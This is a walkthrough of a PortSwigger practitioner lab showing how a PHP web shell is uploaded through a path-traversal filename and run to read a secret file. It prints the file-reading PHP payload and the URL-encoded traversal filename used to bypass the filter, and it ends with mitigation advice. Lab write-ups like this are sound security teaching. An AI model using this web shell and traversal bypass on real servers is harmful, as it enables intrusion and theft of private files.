@@ -1,0 +1,87 @@
+Web Shell Upload via Path Traversal
+
+Lab Difficulty: Practitioner
+Vulnerability Type: File Upload / Path Traversal / Remote Code Execution (RCE)
+Lab Link: PortSwigger Lab
+
+Summary
+This lab demonstrates how file upload mechanisms can be abused in combination with path traversal to achieve remote code execution, even when file execution is normally disabled in the upload directory.
+The attacker leverages directory traversal sequences to escape the restricted folder and place a malicious file in an executable location.
+
+Objective
+Upload a PHP web shell outside the restricted /files/avatars/ directory using path traversal, then execute it to read the contents of /home/carlos/secret and submit the secret to solve the lab.
+
+Technical Walkthrough
+1. Reconnaissance
+Logged in using the provided credentials:
+
+Username: wiener  
+Password: peter  
+Navigated to the profile settings and uploaded a sample .jpg file as an avatar.
+
+Observed that uploaded files are accessible via:
+
+GET /files/avatars/<filename>.jpg
+This confirmed that files are served from the /files/avatars/ directory.
+
+2. Creating a Web Shell
+Created a file named exploit.php containing the following PHP payload:
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+This script reads and prints the contents of the target file.
+
+3. Initial Upload & Behavior
+Uploaded exploit.php as an avatar using Burp Suite.
+
+Tried accessing it via:
+
+GET /files/avatars/exploit.php
+The server returned the raw PHP code, not the output — indicating that PHP execution is disabled in /files/avatars/.
+
+4. Attempted Path Traversal
+Captured the avatar upload request in Burp and modified the filename to:
+
+filename="../exploit.php"
+Response:
+
+The file avatars/exploit.php has been uploaded.
+This suggests the server is stripping traversal sequences from the filename.
+
+5. Bypassing Traversal Filtering
+URL-encoded the forward slash in the filename:
+
+filename="..%2fexploit.php"
+Response:
+
+The file avatars/../exploit.php has been uploaded.
+This indicated that the server is decoding the path and the file is likely placed outside of the avatars directory.
+
+6. Payload Execution
+Sent the following request:
+
+GET /files/avatars/../exploit.php
+Received output containing the secret from Carlos’s home directory.
+
+Also confirmed that the file was accessible directly via:
+
+GET /files/exploit.php
+Result
+The extracted secret was submitted successfully via the lab interface, completing the challenge.
+
+Mitigation
+To prevent such vulnerabilities in real-world applications:
+
+Normalize and sanitize file paths to prevent traversal
+
+Reject directory traversal sequences, even when URL-encoded
+
+Enforce strict server-side validation on file names and paths
+
+Store uploaded files outside the web root, or ensure execution is disabled
+
+Rename uploaded files using server-generated names to avoid user-controlled paths
+
+Use allowlists for file types and MIME types
+
+In PHP environments, disable script execution in upload directories via .htaccess or web server config
+
